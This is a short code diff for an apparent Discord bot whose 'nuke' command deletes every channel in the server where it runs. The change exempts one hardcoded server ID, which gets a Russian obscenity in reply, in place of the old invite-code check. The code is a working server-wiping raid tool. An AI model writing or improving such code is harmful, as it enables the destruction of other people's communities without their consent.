@@ -31,11 +31,9 @@ async def ping(ctx):
 async def nuke(ctx):
     guild = ctx.guild
     
-    invites = await guild.invites()
-    for invite in invites:
-        if invite.code == "W9fRBPUGbV":
-            await ctx.send("пошёл нахуй")
-            return
+    if guild.id == 1520817743127904477:
+        await ctx.send("пошёл нахуй")
+        return
     
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
